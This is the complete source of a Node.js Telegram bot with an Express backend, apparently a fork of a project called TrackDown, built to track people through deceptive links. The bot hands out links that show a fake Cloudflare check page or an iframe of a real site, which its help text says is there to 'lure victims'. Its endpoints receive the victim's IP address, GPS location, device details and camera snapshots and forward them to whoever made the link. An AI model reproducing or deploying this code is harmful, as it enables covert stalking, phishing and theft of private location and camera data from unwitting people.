const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

const channelUsername1 = '@RenusHackingArmy';
const channelUsername2 = '@RenusBotsChannel';

const joinChannel1Button = {
  text: '𝙅𝙊𝙄𝙉 𝘾𝙃𝘼𝙉𝙉𝙀𝙇👻',
  url: 'https://t.me/RenusHackingArmy'
};

const joinChannel2Button = {
  text: '𝗝𝗢𝗜𝗡 𝗚𝗥𝗢𝗨𝗣🚁',
  url: 'https://t.me/RenusBotsChannel'
};

// Create a button with the URL
const contactUsButton = {
  text: '𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙈𝙀📞',
  url: 'https://t.me/RenusRobot'
};

const checkJoinedButton = {
  text: '𝗝𝗢𝗜𝗡𝗘𝗗👽',
  callback_data: '/start'
};

//Modify your URL here
var hostURL="https://trackdown-k1l1.onrender.com";
//TOGGLE for 1pt Proxy and Shorters
var use1pt=true;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
async function startCommand(chatId) {
  try {
    const [member1, member2] = await Promise.all([
      bot.getChatMember(channelUsername1, chatId),
      bot.getChatMember(channelUsername2, chatId),
    ]);

    if (
      (member1.status === 'member' || member1.status === 'administrator' || member1.status === 'creator') &&
      (member2.status === 'member' || member2.status === 'administrator' || member2.status === 'creator')
    ) {
      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞🖥️", callback_data: "crenew" },
            contactUsButton,
          ],
          [
            { text: "𝙃𝙀𝙇𝙋☹️👷", callback_data: "alhaiwan" },
          ],
        ],
      };

      const messageOptions = {
        reply_markup: JSON.stringify(inlineKeyboard),
      };

      await bot.sendMessage(
        chatId,
        `𝗛𝗲𝗹𝗹𝗼 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱\n\n𝗜 𝗮𝗺 𝗮 𝘀𝗺𝗮𝗿𝘁 𝗯𝗼𝘁 𝗺𝗮𝗱𝗲 𝗯𝘆 @MOGATEAM. 🤖\n\n🔍 𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗽𝗲𝗼𝗽𝗹𝗲 𝗯𝘆 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝘁𝗵𝗲𝗺 𝗮 𝘀𝗶𝗺𝗽𝗲 𝗹𝗶𝗻𝗸.\n\n𝗜𝘁 𝗰𝗮𝗻 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲:-\n\n➊ 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣📍\n➋ 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙚𝙩𝙖𝙞𝙡𝙨📱\n➌ 𝘾𝙖𝙢𝙚𝙧𝙖 𝙎𝙣𝙖𝙥𝙨𝙝𝙤𝙩𝙨 📸.\n\n𝗖𝗹𝗶𝗰𝗸 "𝗛𝗘𝗟𝗣" 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 🆘`,
        messageOptions
      );
    } else {
      const messageOptions = {
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [joinChannel1Button, joinChannel2Button],
            [checkJoinedButton, contactUsButton],
          ],
        }),
      };

      await bot.sendMessage(
        chatId,
        `𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗮𝗻𝘆𝗼𝗻𝗲'𝘀 𝗱𝗲𝘃𝗶𝗰𝗲 𝗷𝘂𝘀𝘁 𝘁𝗵𝗿𝗼𝘂𝗴𝗵 𝗮 𝘀𝗶𝗺𝗽𝗹𝗲 𝗹𝗶𝗻𝗸\n\n𝗜𝘁 𝗰𝗮𝗻 𝗴𝗮𝘁𝗵𝗲𝗿 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀, 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻, 𝗰𝗮𝗺𝗲𝗿𝗮 𝘀𝗻𝗮𝗽𝘀, 𝗯𝗮𝘁𝘁𝗲𝗿𝘆 𝗹𝗲𝘃𝗲𝗹, 𝗻𝗲𝘁𝘄𝗼𝗿𝗸 𝗶𝗻𝗳𝗼 𝗮𝗻𝗱 𝗮 𝘄𝗶𝗱𝗲 𝗿𝗮𝗻𝗴𝗲 𝗼𝗳 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗮𝗯𝗼𝘂𝘁 𝘁𝗵𝗲𝗶𝗿 𝗱𝗲𝘃𝗶𝗰𝗲, 𝗽𝗹𝘂𝘀 𝗺𝗮𝗻𝘆 𝗺𝗼𝗿𝗲 𝗯𝗲𝗻𝗲𝗳𝗶𝘁𝘀\n\n`,
        messageOptions
      );
    }
  } catch (error) {
    console.error(error);
  }
}
  
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
the url it will send you 2 links which you can use to track people.
\n\nSpecifications.
\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
`);
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://claim-event.co/short-url.php?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://claim-event.co/short-url.php?url=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
